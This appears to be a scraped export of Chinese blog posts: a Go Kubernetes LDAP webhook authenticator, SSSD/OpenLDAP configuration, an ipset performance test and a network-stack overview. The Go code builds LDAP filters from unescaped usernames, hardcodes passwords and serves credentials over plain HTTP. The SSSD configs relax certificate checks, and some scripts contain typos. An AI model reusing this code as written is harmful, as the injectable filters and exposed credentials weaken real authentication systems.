klog.V(3).Info(\u0026quot;User does not exist\u0026quot;) return nil, errors.New(\u0026quot;User does not exist\u0026quot;) } else { // 验证用户名密码是否正确 if err := ldapconn.Bind(userResult.Entries[0].DN, password); err != nil { e := fmt.Sprintf(\u0026quot;Failed to auth. %s\\n\u0026quot;, err) klog.V(3).Info(e) return nil, errors.New(e) } else { klog.V(3).Info(fmt.Sprintf(\u0026quot;User %s Authenticated successfuly!\u0026quot;, username)) } // 拼接为kubernetes authentication 的用户格式 user := new(v1.UserInfo) for _, v := range result.Entries { attrubute := v.GetAttributeValue(\u0026quot;objectClass\u0026quot;) if strings.Contains(attrubute, \u0026quot;posixGroup\u0026quot;) { user.Groups = append(user.Groups, v.GetAttributeValue(\u0026quot;cn\u0026quot;)) } } u := userResult.Entries[0].GetAttributeValue(\u0026quot;uid\u0026quot;) user.UID = u user.Username = u return user, nil } } 编写HTTP部分 这里有几个需要注意的部分，即用户或者理解为要认证的token的定义，此处使用了 ”username@password“ 格式作为用户的辨别，即登录kubernetes时需要直接输入 ”username@password“ 来作为登录的凭据。\n第二个部分为返回值，返回给Kubernetes的格式必须为 api/authentication/v1.TokenReview 格式，Status.Authenticated 表示用户身份验证结果，如果该用户合法，则设置 tokenReview.Status.Authenticated = true 反之亦然。如果验证成功还需要 Status.User 这就是在ldapSearch\nfunc serve(w http.ResponseWriter, r *http.Request) { b, err := ioutil.ReadAll(r.Body) if err != nil { httpError(w, err) return } klog.V(4).Info(\u0026quot;Receiving: %s\\n\u0026quot;, string(b)) var tokenReview v1.TokenReview err = json.Unmarshal(b, \u0026amp;tokenReview) if err != nil { klog.V(3).Info(\u0026quot;Json convert err: \u0026quot;, err) httpError(w, err) return } // 提取用户名与密码 s := strings.SplitN(tokenReview.Spec.Token, \u0026quot;@\u0026quot;, 2) if len(s) != 2 { klog.V(3).Info(fmt.Errorf(\u0026quot;badly formatted token: %s\u0026quot;, tokenReview.Spec.Token)) httpError(w, fmt.Errorf(\u0026quot;badly formatted token: %s\u0026quot;, tokenReview.Spec.Token)) return } username, password := s[0], s[1] // 查询ldap，验证用户是否合法 userInfo, err := ldapSearch(username, password) if err != nil { // 这里不打印日志的原因是 ldapSearch 中打印过了 return } // 设置返回的tokenReview if userInfo == nil { tokenReview.Status.Authenticated = false } else { tokenReview.Status.Authenticated = true tokenReview.Status.User = *userInfo } b, err = json.Marshal(tokenReview) if err != nil { klog.V(3).Info(\u0026quot;Json convert err: \u0026quot;, err) httpError(w, err) return } w.Write(b) klog.V(3).Info(\u0026quot;Returning: \u0026quot;, string(b)) } func httpError(w http.ResponseWriter, err error) { err = fmt.Errorf(\u0026quot;Error: %v\u0026quot;, err) w.WriteHeader(http.StatusInternalServerError) // 500 fmt.Fprintln(w, err) klog.V(4).Info(\u0026quot;httpcode 500: \u0026quot;, err) } 下面是完整的代码\npackage main import ( \u0026quot;encoding/json\u0026quot; \u0026quot;errors\u0026quot; \u0026quot;flag\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;io/ioutil\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;strings\u0026quot; \u0026quot;github.com/go-ldap/ldap\u0026quot; \u0026quot;k8s.io/api/authentication/v1\u0026quot; \u0026quot;k8s.io/klog/v2\u0026quot; ) var ldapURL string func main() { klog.InitFlags(nil) flag.Parse() http.HandleFunc(\u0026quot;/authenticate\u0026quot;, serve) klog.V(4).Info(\u0026quot;Listening on port 443 waiting for requests...\u0026quot;) klog.V(4).Info(http.ListenAndServe(\u0026quot;:443\u0026quot;, nil)) ldapURL = \u0026quot;ldap://10.0.0.10:389\u0026quot; ldapSearch(\u0026quot;admin\u0026quot;, \u0026quot;1111\u0026quot;) } func serve(w http.ResponseWriter, r *http.Request) { b, err := ioutil.ReadAll(r.Body) if err != nil { httpError(w, err) return } klog.V(4).Info(\u0026quot;Receiving: %s\\n\u0026quot;, string(b)) var tokenReview v1.TokenReview err = json.Unmarshal(b, \u0026amp;tokenReview) if err != nil { klog.V(3).Info(\u0026quot;Json convert err: \u0026quot;, err) httpError(w, err) return } // 提取用户名与密码 s := strings.SplitN(tokenReview.Spec.Token, \u0026quot;@\u0026quot;, 2) if len(s) != 2 { klog.V(3).Info(fmt.Errorf(\u0026quot;badly formatted token: %s\u0026quot;, tokenReview.Spec.Token)) httpError(w, fmt.Errorf(\u0026quot;badly formatted token: %s\u0026quot;, tokenReview.Spec.Token)) return } username, password := s[0], s[1] // 查询ldap，验证用户是否合法 userInfo, err := ldapSearch(username, password) if err != nil { // 这里不打印日志的原因是 ldapSearch 中打印过了 return } // 设置返回的tokenReview if userInfo == nil { tokenReview.Status.Authenticated = false } else { tokenReview.Status.Authenticated = true tokenReview.Status.User = *userInfo } b, err = json.Marshal(tokenReview) if err != nil { klog.V(3).Info(\u0026quot;Json convert err: \u0026quot;, err) httpError(w, err) return } w.Write(b) klog.V(3).Info(\u0026quot;Returning: \u0026quot;, string(b)) } func httpError(w http.ResponseWriter, err error) { err = fmt.Errorf(\u0026quot;Error: %v\u0026quot;, err) w.WriteHeader(http.StatusInternalServerError) // 500 fmt.Fprintln(w, err) klog.V(4).Info(\u0026quot;httpcode 500: \u0026quot;, err) } func ldapSearch(username, password string) (*v1.UserInfo, error) { ldapconn, err := ldap.DialURL(ldapURL) if err != nil { klog.V(3).Info(err) return nil, err } defer ldapconn.Close() // Authenticate as LDAP admin user err = ldapconn.Bind(\u0026quot;cn=admin,dc=test,dc=com\u0026quot;, \u0026quot;111\u0026quot;) if err != nil { klog.V(3).Info(err) return nil, err } // Execute LDAP Search request result, err := ldapconn.Search(ldap.NewSearchRequest( \u0026quot;ou=tvb,dc=test,dc=com\u0026quot;, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, fmt.Sprintf(\u0026quot;(\u0026amp;(objectClass=posixGroup)(memberUid=%s))\u0026quot;, username), // Filter nil, nil, )) if err != nil { klog.V(3).Info(err) return nil, err } userResult, err := ldapconn.Search(ldap.NewSearchRequest( \u0026quot;ou=tvb,dc=test,dc=com\u0026quot;, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, fmt.Sprintf(\u0026quot;(\u0026amp;(objectClass=posixAccount)(uid=%s))\u0026quot;, username), // Filter nil, nil, )) if err != nil { klog.V(3).Info(err) return nil, err } if len(result.Entries) == 0 { klog.V(3).Info(\u0026quot;User does not exist\u0026quot;) return nil, errors.New(\u0026quot;User does not exist\u0026quot;) } else { // 验证用户名密码是否正确 if err := ldapconn.Bind(userResult.Entries[0].DN, password); err != nil { e := fmt.Sprintf(\u0026quot;Failed to auth. %s\\n\u0026quot;, err) klog.V(3).Info(e) return nil, errors.New(e) } else { klog.V(3).Info(fmt.Sprintf(\u0026quot;User %s Authenticated successfuly!\u0026quot;, username)) } // 拼接为kubernetes authentication 的用户格式 user := new(v1.UserInfo) for _, v := range result.Entries { attrubute := v.GetAttributeValue(\u0026quot;objectClass\u0026quot;) if strings.Contains(attrubute, \u0026quot;posixGroup\u0026quot;) { user.Groups = append(user.Groups, v.GetAttributeValue(\u0026quot;cn\u0026quot;)) } } u := userResult.Entries[0].GetAttributeValue(\u0026quot;uid\u0026quot;) user.UID = u user.Username = u return user, nil } } 部署webhook kubernetes官方手册中指出，启用webhook认证的标记是在 kube-apiserver 指定参数 --authentication-token-webhook-config-file 。而这个配置文件是一个 kubeconfig 类型的文件格式 [5]\n下列是部署在kubernetes集群外部的配置\n创建一个给 kube-apiserver 使用的配置文件 /etc/kubernetes/auth/authentication-webhook.conf\napiVersion: v1 kind: Config clusters: - cluster: server: http://10.0.0.1:88/authenticate name: authenticator users: - name: webhook-authenticator current-context: webhook-authenticator@authenticator contexts: - context: cluster: authenticator user: webhook-authenticator name: webhook-authenticator@authenticator 修改 kube-apiserver 参数\n# 指向对应的配置文件 --authentication-token-webhook-config-file=/etc/kubernetes/auth/authentication-webhook.conf # 这个是token缓存时间，指的是用户在访问API时验证通过后在一定时间内无需在请求webhook进行认证了 --authentication-token-webhook-cache-ttl=30m # 版本指定为API使用哪个版本？authentication.k8s.io/v1或v1beta1 --authentication-token-webhook-version=v1 启动服务后，创建一个 kubeconfig 中的用户用于验证结果\napiVersion: v1 clusters: - cluster: certificate-authority-data: server: https://10.0.0.4:6443 name: kubernetes contexts: - context: cluster: kubernetes user: k8s-admin name: k8s-admin@kubernetes current-context: k8s-admin@kubernetes kind: Config preferences: {} users: - name: admin user: token: admin@111 验证结果 当密码不正确时，使用用户admin请求集群\n$ kubectl get pods --user=admin error: You must be logged in to the server (Unauthorized) 当密码正确时，使用用户admin请求集群\n$ kubectl get pods --user=admin Error from server (Forbidden): pods is forbidden: User \u0026quot;admin\u0026quot; cannot list resource \u0026quot;pods\u0026quot; in API group \u0026quot;\u0026quot; in the namespace \u0026quot;default\u0026quot; 可以看到admin用户是一个不存在与集群中的用户，并且提示没有权限操作对应资源，此时将admin用户与集群中的cluster-admin绑定，测试结果\n$ kubectl create clusterrolebinding admin \\ --clusterrole=cluster-admin \\ --group=admin 此时再尝试使用admin用户访问集群\n$ kubectl get pods --user=admin NAME READY STATUS RESTARTS AGE netbox-85865d5556-hfg6v 1/1 Running 0 91d netbox-85865d5556-vlgr4 1/1 Running 0 91d 总结 kubernetes authentication 插件提供的功能可以注入一个认证系统，这样可以完美解决了kubernetes中用户的问题，而这些用户并不存在与kubernetes中，并且也无需为多个用户准备大量serviceaccount或者证书，也可以完成鉴权操作。首先返回值标准如下所示，如果kubernetes集群有对在其他用户系统中获得的 Groups 并建立了 clusterrolebinding 或 rolebinding 那么这个组的所有用户都将有这些权限。管理员只需要维护与公司用户系统中组同样多的 clusterrole 与 clusterrolebinding 即可\ntype DefaultInfo struct { Name string UID string Groups []string Extra map[string][]string } 对于如何将 kubernetes 与其他平台进行融合可以参考 文章\nNotes：Kubernetes原生就支持OID，完全不用自己开发webhook从而实现接入其他系统，这里展示的只是一个思路\nReference [1] Implementing a custom Kubernetes authentication method\n[2] Controlling Access to the Kubernetes API\n[3] Users in Kubernetes\n[4] bootstrap tokens\n[5] Webhook Token Authentication\n","permalink":"https://www.oomkill.com/2022/11/ch31-authentication/","summary":"","title":"深入理解Kubernetes 4A - Authentication源码解析"},{"content":"Overview SSSD (System Security Services Daemon) 是一套用于远程身份验证的套件服务，为使用SSSD服务的客户端提供了远程访问身份认证服务来获取权限，其后端包括AD, LDAP等，本文将围绕下列方向来阐述SSSD：\n为什么需要SSSD，以及使用SSSD来解决什么 使用SSSD的好处 SSSD服务工作原理及架构 如何在Linux上配置SSSD+LDAP 为什么需要SSSD SSSD设计主要是为了传统使用身份认证服务，例如PAM+NSS架构中存在的一些问题：\nPAM+NSS扩展性差，并配置较为复杂，尽管提供了 authconfig ，通常在大多数教程中以及不同的系统中配置都不相同 PAM+NSS不是真正意义上的离线身份认证，如果当 nslcd 或者 slapd 等服务异常时，无法完成用户认证 以及越来越多的后端，例如LDAP, AD, IPA, IdM,Kerberos等无法做到很好的适配 SSSD就是为了解决上述的问题，对于Linux平台中，SSSD拥有比传统PAM+NSS更好的优势：\n符合现代Linux基础架构设计需求，可以适配更多的后端，并降低了操作配置的复杂性 增加了缓存功能，有效的减少了对于后端服务器的负载 因为有了缓存功能，实现了真正的离线认证功能，即使后端服务异常，例如LDAP服务down 了解SSSD架构 了解SSSD架构，其实就是了解前两章的内容，要做到真正的多后端，真脱机，那么服务就有多个组件组成：\nMonitor：所有SSSD的父进程，即用于管理 Providers 与 Responders Providers：用于感知验证后端的模块，后端就是提供目录树的一端 Responders：为Linux提供与后端交互的功能，这部分通常为 NSS PAM sudo等 图：SSSD架构图 Source：https://sssd.io/docs/architecture.html\nProviders Local：保存在本地缓存中的账户信息 LDAP, Kerberos, AD, IPA ：用于 Linux/UNIX 网络环境中集成身份和身份验证解决方案。 IdM：一种使用本地 Linux 工具在 Linux 系统上创建身份存储、集中身份验证、Kerberos 和 DNS 服务的域控制以及授权策略的目录树后端 sudo，autofs 与LDAP集成的功能 Responders nss：名称解析服务，用于解析组与用户信息 pam：用于用户验证的模块 autofs：自动挂载模块，通常用于与LDAP集成，用于映射LDAP目录树 sudo：linux中用户权限控制，通常也是与LDAP集成 ssh： sssd_be：SSSD的后端进程：其中每一种后端都代表都作为一个sssd_be进程启动 monitor monitor是SSSD的进程，是用于管理（启动，停止，监控服务状态）Provider与Responders的功能\nSSSD工作流程 当每次用户登录，使用 id, getent, su , sudo 等命令时，都会触发一次查询，下图是整个查询的流程\n图：SSSD查询流程 Source：https://sssd.io/docs/architecture.html\n可以看到图中描述了对用户 Alice 进行查询，从调用函数getpwnam 开始，首先会在memcache中检索用户数据，如果检索不到，此时 sssd_nss（sssd内置的模块）将从本地cache检索，如果此时还是检索不到，那么 sssd_be (上面提到过一个后端会有一个 sssd_be 进程) 将从远程后端检索。\n通过这种模式，增加了缓存功能，有效的减少了对于后端服务器的负载，以及完整的脱机查询功能（即使LDAP服务短暂不可用），而存在的问题则是可能会造成本地资源负载过高，例如这个例子：由于服务器忙时，并且sssd_nss 造成与其他进程争抢资源 [2]\n迁移nslcd到sssd 安装sssd CentOS 6/CentOS 7：yum install sssd sssd-tools [3] Ubuntu/Debian：apt install sssd-ldap ldap-utils [4] 配置SSSD 先决条件：建议使用SSL模式与openldap进行通信，此时数据是加密传输的\n默认安装好sssd后，不存在配置文件，需要手动创建配置文件 /etc/sssd/sssd.conf\nchown root:root /etc/sssd/sssd.conf chmod 600 /etc/sssd/sssd.conf 复制下列配置到 /etc/sssd/sssd.conf\n[sssd] # sssd全局配置，service为需要使用的模块，这里将会启动一个子进程 # 例如传统的nss+pam作为linux认证的基础，这里开启就为nss,pam services = nss, pam config_file_version = 2 # domains作为给后端配置提供的一个名称 domains = default # 如果需要对每个模块定义的配置可以[\u0026lt;module_name\u0026gt;]进行配置 [pam] # 成功登录后的用户在sssd中缓存的天数。 如果为0将意味着永久保存。 offline_credentials_expiration = 60 [domain/default] # 启用tls通讯 ldap_id_use_start_tls = True # 这个与offline_credentials_expiration进行配合的参数 # 如果true 将在offline_credentials_expiration天后是否查找缓存 # 如果为false，或不填写该参数将不查找 cache_credentials = True # 搜索的跟域 ldap_search_base = dc=ldapmaster,dc=kifarunix-demo,dc=com # 下面是一系列provider id_provider = ldap auth_provider = ldap chpass_provider = ldap access_provider = ldap # ldap相关配置 ldap_uri = ldap://ldapmaster.kifarunix-demo.com # 搜索使用的ldap用户 ldap_default_bind_dn = cn=readonly,ou=system,dc=ldapmaster,dc=kifarunix-demo,dc=com # 搜索使用的ldap用户的密码，仅支持明文 ldap_default_authtok = P@ssWOrd # tls相关参数 # 这个参数是指定TLS绘画是否对服务器证书进行检查 # never 客户端不检查服务器证书 # allow 请求验证服务端证书，如果没有证书则会话正常进行，如果证书错误，将被忽略 # demand 请求验证服务端证书，如果证书错误或者没有证书，终止会话 # try 请求验证服务端证书，如果没有证书则会话正常进行，如果证书错误，终止会话 ldap_tls_reqcert = demand ldap_tls_cacert = /etc/openldap/certs/cacert.pem # 与ldap服务端通信超时相关配置 ldap_search_timeout = 50 ldap_network_timeout = 60 # 搜索用户的参数，下列是默认条件，这是强制参数，sssd在ldap上搜索用户的搜索条件，如果目录树是特别的名称需要更改 ldap_access_order = filter ldap_access_filter = (objectClass=posixAccount) # 例如 ldap_access_filter = memberOf=cn=allowedusers,ou=Groups,dc=example,dc=com 配置完成后可以启动服务，该服务与使用 nlscd 一样，需要开机自启，否则远端用户将不能完成认证\nsystemctl start sssd systemctl enable sssd 完成后需要配置下 nss 与 pam 的配置\nCentOS 7：authconfig --enablesssd --enablesssdauth --enablemkhomedir --update CentOS 8：authselect apply-changes -b --backup=ldap-configuration-backup Ubuntu：pam-auth-update --enable mkhomedir Notes：参数根据平台不同命令也不同，可以man查看下具体需要配置什么\nsudo over sssd 对于sudo方面，配置没有使用nss+pam架构那么复杂只需要加几个参数即可使用sssd作为sudo认证\n[sssd] .. # service 增加 sudo services = nss, pam, sudo, ssh domains = default debug_level = 6 [sudo] # 枚举授信域 subdomain_enumerate = true debug_level = 9 [domain/default] ... # provider 增加 sudo_provider sudo_provider = ldap # 配置sudo默认搜索域，也就是sudoers的跟容器，这个必须设置 ldap_sudo_search_base = ou=SUDOers,dc=test,dc=com # sssd在下载ldap服务端的sudo规则间隔秒数 # 默认21600 ldap_sudo_full_refresh_interval=86400 # 智能刷新，默认900秒，可以设置为0禁止只能刷新 # 该参数是指，下载条目为服务端USD高于当前SSSD的USN最高值的所有规则 # USD Update Sequence Number 代表数据变化的序列 ldap_sudo_smart_refresh_interval=3600 下面为sudo 与 NSS+PAM 迁移至SSSD的完整配置\n[sssd] config_file_version = 2 services = nss, pam, sudo, ssh domains = default debug_level = 6 [pam] offline_credentials_expiration = 60 [sudo] subdomain_enumerate = true debug_level = 9 [domain/default] id_provider = ldap auth_provider = ldap sudo_provider = ldap ldap_uri = ldaps://10.0.0.10/ ldap_search_base = dc=test,dc=com ldap_sudo_search_base = ou=SUDOers,dc=test,dc=com ldap_default_bind_dn = uid=searchUser,ou=tvb,dc=test,dc=com ldap_default_authtok_type = password ldap_default_authtok = 1 cache_credentials = True ldap_search_timeout = 50 ldap_network_timeout = 60 ldap_access_order = filter ldap_access_filter = (objectClass=posixAccount) ldap_tls_cacert = /etc/ssl/certs/cacert.crt ldap_id_use_start_tls = true ldap_tls_reqcert = allow ldap_sudo_full_refresh_interval=86400 ldap_sudo_smart_refresh_interval=3600 此时验证用户登录与sudo是使用SSSD缓存还是通过每次请求slapd\nNotes：对于更多的配置参数的说明，可以使用 man sssd , man sssd-ldap .. 进行查询 ，也可以通过 linux man 手册进行查询\nTroubleshooting ldap 日志报错 TLS established tls_ssf=256 ssf=256 [5]\nSep 19 12:16:40 centos6 slapd[16620]: conn=228 fd=14 ACCEPT from IP=client-IP:client-Port (IP=0.0.0.0:636) Sep 19 12:16:40 centos6 slapd[16620]: conn=228 fd=14 TLS established tls_ssf=256 ssf=256 这里原因是，如果你使用TLS进行通讯，只有基于 ldap://[port_389] 才是TLS，如果使用 ldaps://[port_636] 那么是通过SSL隧道进行的\n解决：对于SSSD端需要开启对应的TLS配置，如下\nldap_tls_cacert = /etc/ssl/certs/cacert.crt ldap_id_use_start_tls = true # 对服务器提供的证书执行的检查,因为服务端配置了要验证客户端证书 ldap_tls_reqcert = allow Reference [1] sssd architecture\n[2] High CPU usage by sssd_nss during heavy disk IO\n[3] SSSD and LDAP\n[4] Chapter 10. Migrating authentication from nslcd to SSSD\n[5] OpenLDAP Client 2.4.23: TLS negotiation failure\n[6] Chapter 10. Migrating authentication from nslcd to SSSD\n[7] Configure SSSD\n[8] Configure OpenLDAP SSSD client on CentOS 6/7\n","permalink":"https://www.oomkill.com/2022/11/ch11-sssd/","summary":"","title":"理解ldap - 使用SSSD接入OpenLDAP实现身份验证"},{"content":"测试方法 基于使用场景，最后⽣成的规则会是按照 ip 或者 ip:port 来进行过滤，测试时将使用10万条 iptables 规则来模拟对性能的压力；为了最大化测试压力情况，10万条 iptables 规则将都是==不会匹配==机房流量，通俗来讲，就是链式匹配会进行所有匹配并最后以无匹配告终。\n网络负载的模拟将使用同机房 scp 来模拟，并按照下述条件进行匹配：\n查看正常的拷贝速度，cpu负载等 我们建⽴10万条的普通 iptables 规则，查看规则建立速度，拷贝速度，CPU负载，CPU主要耗时操作等 我们建⽴10万的 ipset ，并把普通的 iptables 规则转为结合 ipset 的规则，查看规则建立速度，拷贝速度，CPU负载，CPU主要耗时等。 实验开始 步骤一：在同机房的⼀个机器构造⼀个大文件\n同机房拷贝\n观察网卡速度，CPU，系统主要耗时操作的等，此场景将在iptables 规则为空的情况下进行观察\n使用 sar 观测网卡速度\n使用 top 观察CPU负载\n使用 perf top -G 观察CPU占用\n步骤二：创建10万条iptables，观察⽹卡速度、cpu、系统主要耗时操作的等，会发现cpu利⽤率⼤部分被ipt占⽤，拷⻉速度下降到不到⼗分之⼀\n#!/bin/bash echo *filter for ((i=1;i\u0026lt;=$1;i++)) do echo -I INPUT -S $i -j ACCEPT done echo COMMIT 执行脚本\n$ time ./mkrule.sh 100000 | sudo iptables-restore 观察添加规则后的⽹卡速度，CPU，系统主要耗时操作的等\n使用 sar 观测网卡速度\n使用 top 观察CPU负载\n使用 perf top -G 观察CPU占用\n步骤三：使用ipset替换iptables\n此时改为使⽤ ipset ⽅式观察网卡卡速度，CPU，系统主要耗时操作的等，会发现跟没有规则没有明显变化。ipset的内存量不到2M。初步估计内存使⽤量 = $hashsize \\times 16 + 存⼊数 \\times (4～32之间)$\n#!/bin/bash #ipset create whitelist hash:ip maxelem 1000000 -exist #ipset flush whitelist echo ' creae whitelist hash:ip family inet hashsize 65536 maxelem 100000000' for ((i=1;i\u0026lt;=$1;i++)) do\t#ipset add whitelist $i echo add whitelist $i done # iptables -I INPUT -m set --match-set whitelisti src -j ACCEPT 执行脚本\n$ time ./mkset.sh 100000 | sudo ipset restore $ sudo iptables -Ln $ sudo iptables -I INPUT -m set --match-set whitelisti src -j ACCEPT 观察添加规则后的⽹卡速度，CPU，系统主要耗时操作的等\n使用 sar 观测网卡速度\n使用 top 观察CPU负载\n使用 perf top -G 观察CPU占用\n$ sudo ipset list | head Name: whitelist Type: hash:ip Header: family inet hashsize 65536 maxelem 100000000 Size in memory: 1891208 References: 1 总结：ipset对于CPU和内存的影响很小，在大量规则场景下符合预期\n","permalink":"https://www.oomkill.com/2022/11/ipset-preformance/","summary":"","title":"ipset性能测试"},{"content":"Linux 架构概述 [1] 本章节简单阐述Linux系统的结构，并讨论子系统中的模块之间以及与其他子系统之间的关系。\nLinux内核本身鼓励无用，是作为一个操作系统的一部分参与的，只有为一个整体时他才是一个有用的实体，下图展示了Linux操作系统的分层\n图：Linux子系统分层图 Source：https://docs.huihoo.com/linux/kernel/a1/index.html\n由图可以看出Linux操作系统由四部分组成：\n用户应用 OS服务，操作系统的一部分（例如shell）内核编程接口等 内核 硬件控制器，CPU、内存硬件、硬盘和NIC等都数据这部分 Linux内核阐述 Linux内核将所有硬件抽象为一致的接口，为用户进程提供了一个虚拟接口，使用户无需知道计算机上安装了哪些物理硬件即可编写进程，并且Linux支持用户进程的多任务处理，每个进程都可以视作为操作系统的唯一进程独享硬件资源。内核负责维护多个用户进程，并协调其对硬件资源的访问，使得每个进程都可以公平的访问资源，并保证进程间安全。\nLinux内核主要为五个子系统组成：\n进程调度器(SCHED)， 控制进程对 CPU 的访问。调度程序执行策略，确保进程可以公平地访问 CPU。 内存管理器 (MM)， 允许多个进程安全地共享操作系统的内存 虚拟文件系统 (VFS)，向所有设备提供通用文件接口来抽象出各种硬件设备 网络接口 (NET)，提供对多种网络标准与各种网络硬件的访问 进程间通信 (IPC)，在单个操作系统上的多种机制进程间通信机制 网络子系统架构 [2] 网络子系统功能主要是允许 Linux 系统通过网络连接到其他系统。支持多种硬件设备，以及可以使用的多种网络协议。网络子系统抽象了这两个实现细节，以便用户进程和其他内核子系统可以访问网络，而不必知道使用什么物理设备或协议。\n子系统模块包含\n网络设备驱动层 (Network device drivers)，网络设备驱动程序与硬件设备通信。每个硬件设备都有对应的设备驱动程序模块。 独立设备接口层(device independent interface)，设备独立接口提供了所有硬件设备的统一视图，因此在网络子系统之上的级别无需了解硬件信息 网络协议层 (network protocol)，网络协议实现了网络传输的协议 协议独立/无关接口层 (protocol independent interface)，提供了独立于硬件设备的网络接口，为内核内其他子系统访问网络时不依赖特定的协议和硬件接口。 系统调用层 (system call) 用于限制用户进程导出资源的访问 网络子系统的结构图如下图所示，\n图：网络子系统中的上下文 Source：https://docs.huihoo.com/linux/kernel/a1/index.html\n当网络子系统转换为网络栈时，如下图所示\n图：ISO Stack与TCP/IP Stack Source：https://www.washington.edu/R870/Networking.html\n当然Linux网络子系统是类似于TCP/IP栈的一种结构，当发生一个网络传输时，数据包会按照所经过的层进行封装。例如应用层应用提供了REST API，那么应用将要传输的数据封装为HTTP协议，然后传递给向下的传输层。传输层是TCP协议就会被添加对应的TCP包头。整个封装过程原始包保持不变，会根据所经过层的不同增加固定格式的包头。\n图：数据包传输在每层被封装的过程 Source：http://www.embeddedlinux.org.cn/linux_net/0596002556/understandlni-CHP-13-SECT-1.html\n对于Linux来说TCP/IP 的五层结构则是构成网络子系统的的核心组件，下图是Linux网络栈结构图\n图：Linux网络栈的结构图 Source：https://medium.com/geekculture/linux-networking-deep-dive-731848d791c0\n图中橙色部分是位于TCP/IP的五层结构中的应用层，应用层向下通讯通过 system call 与 socket接口进行交互 蓝色部分是位于内核空间，socket向下则是传输层与网络层 最底层是物理层包含网卡驱动与NIC 通过图可以看出，NIC是发送与接收数据包的基本单位，当系统启动时内核通过驱动程序向操作系统注册网卡，当数据包到达网卡时，被放入队列中。内核通过硬中断，运行中断处理程序，为网络帧分配内核数据结构(sk_buff)，并将其拷贝到缓冲区中，此为内核与网卡交互的过程。\n网卡硬中断只处理网卡核心数据的读取或发送，网络协议栈中的大部分处理都在软中断中进行处理。内核协议栈将从缓冲区中取出网络帧，通过网络协议栈，从下到上的根据网络栈结构逐层处理这个网络帧。\nSocket [4] Unix Socket是一种使用了Unix文件描述符的IPC机制，在网络栈中是位于内核空间网络栈的一层，是一个用户空间与传输层之间的一个接口，可以为网络连接, 文本文件, 终端或其他；他的行为很像一个文件描述符，因为信息的读写，read(), write()与文件的方式很相似。下图是socket通信模型。\n图：socket通信模型 Source：https://slideplayer.com/slide/10740698/\n作为用户空间到内核空间的第一层，Socket位于两层之间，由于IPC机制支持不同的通讯协议以及需要对不同的网络协议进行访问，故这些协议实现为位于socket的层，这种情况下，用户空间仅通过系统调用socket接口，而内核空间负责一些其他工作，例如，缓冲区管理，标准协议接口，网络接口与各种不同的网络协议。\nNotes:\n/etc/protocols 定义的协议号 /etc/services 定义的服务的端口号 网络栈的工作原理 当网络包到达时，网卡（硬中断+DMA）通过DMA将网络数据包放入队列中，告知中断程序硬中断已收到网络数据包。\n数据包的发送 用户程序发送网络包时，通过网络栈模型自上而下逐层处理帧：\n应用层：通过系统调用，调用socket API发送网络包，会被限制在内核空间的socket层，socket层将数据包放入到缓冲区内。 传输层：网络栈从socket取出数据包，传输层添加TCP标头 网络层：将IP添加到数据标头，根据MTU大小分片 数据链路层：MAC地址寻址，并添加到帧头尾，将帧放入发送队列，触发软中断通知 物理层：网卡驱动通过DMA从发送队列读取网络帧，通过网卡发送出 数据包的接收 内核网络栈从缓冲区读取帧，通过网络栈模型自下而上逐层处理帧：\n数据链路层： 检查数据包的有效性 确定网络协议类型 IPV4 or IPV6 去除帧 头, 尾 网络层： 取出IP头，确定网络流量的方向（转发或者本机流量） 删除标头，传递给传输层 传输层：取出TCP/UDP协议头，根据源IP, 目的IP, 源端口, 目的端口作为标识找到socket，将数据报文放置socket缓冲区 应用层：应用程序通过socket来读数据 下图为网络栈收/发数据的结构图\n图：Linux网络进程接收网络数据包流程图 Source：https://slideplayer.com/slide/10740698/\n网络子系统分层结构 在了解了网络接受网络数据包的流程后，还需要对网络子系统中分层结构进行了解，在该结构中将需要基础掌握一些对于工作与网络子系统中的API的命令是如何调用的。\n下图是结合 《深入理解Linux网络技术内幕》第13章 [3] 中插图13-2与 托马斯格拉夫发表于2019年的文章 \u0026ldquo;How to Make Linux Microservice-Aware with Cilium and eBPF\u0026rdquo; [5] 的结合旨在让零基础同学可以更好的了解到各API的分层调用\n图：Linux网络子系统分层调用\n图中可以看出，是一个基于TCP/IP栈的调用模型，其中应用层包含了常用的工具：\n配置IP路由：ip ip防火墙（包过滤）：iptables 流量整形：tc 网络抓包：tcpdump 网卡信息：ethtool 对于云原生网络中，了解完整的分层是非常重要的，这将有利于开发基于eBPF服务。下面就简单的论证下该图\n正如图中所示，所有的网络命令都是提供给用户的用户空间API，当发生网络动作时是需要通过内核将数据导入/出，这里使用了系统调用，调用内核提供的导入到用户空间的接口，例如 socket，sysctl 等，更多的接口介绍可以详见《深入理解Linux网络技术内幕》第3章 [6]\n到达socket后，继续向下通信时，socket提供了几种级别的接口，这些可以在常见编程语言包中被提供\nAE_PACKAGE / PE_PACKAGE：提供设备级别的API，通俗来讲，就是在网络层之下发送/接受消息的接口，工作于2层，这将允许用户在用户空间实现物理层数据包发送和接收 AF_INET / PE_INET：是基于网络层Socket类型，AF_INET是指IPv4，AF_INET6 是IPv6，这里就是IP 地址和端口号。 如图所示，对于 PE_PACKAGE 套接字类型而言，Linux在链路层捕捉帧并将其注入至链路层的方式，这样跳过了所有的中间层，例如 tcpdump 与 ethtool， PE_PACKAGE 套接字通过将帧直接交给 dev_queue_xmit。\ndev_queue_xmit 是传输 buffer (sk_buff) 到网络设备中的函数，将封包传递给TC或QoS层，L3封包时调用 接下来是iptables，netfilter，是工作与多层协议栈中一系列hook，用户端由命令行工具iptables/nftables控制，可以在数据包经由的数据点上被调用对应的hook函数来改变包的行为。所有的数据包都独立存在于对应的协议栈，经过的数据包会便利所有对应的hook，因为iptables(etables)支持工作于L2的ARP协议。所有的hook都存在与每个网络名称空间内，并且每个网络设备都拥有ingress hook，这也是云原生网络中提到的为什么使用eBPF 跳过netfilter框架可以提升网络性能。\n图：Linux 栈中经由netfilter框架示意图 Source：http://www.embeddedlinux.org.cn/linux_net/0596002556/understandlni-CHP-18-SECT-1.html\n接下来就是传统的一些应用，例如telnet，ping都是使用了AE_PACKAGE / PE_PACKAGE 传统联网模式\n最后一个点就是 traffic control TC，是工作与L2的一组队列与其机制组成的，通常情况下是一个队列，上面也提到，所有的设备都是使用队列来调度底层设备进入的数据包，liunx中默认的队列是 qdisc 。\nReference [1] Conceptual Architecture of the Linux Kernel\n[2] Linux — Networking Deep Dive\n[3] Network Stack Chapter13\n[4] User Datagram Protocol (UDP) and IP Fragmentation\n[5] How to Make Linux 